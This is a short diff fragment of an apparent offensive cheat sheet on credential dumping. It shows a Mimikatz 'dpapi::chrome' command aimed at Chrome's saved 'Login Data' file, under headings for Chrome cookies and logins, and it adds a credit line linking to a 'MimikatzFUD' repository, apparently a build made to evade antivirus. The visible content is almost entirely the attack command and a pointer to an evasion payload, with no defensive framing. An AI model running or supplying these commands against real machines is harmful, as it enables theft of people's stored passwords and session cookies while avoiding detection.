@@ -30,3 +30,6 @@ Chrome Cookies
 
 Chrome Logins
 - dpapi::chrome /in:"C:\Users\%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" 
+
+# Mimikatz payload credits
+https://github.com/HernanRodriguez1/MimikatzFUD
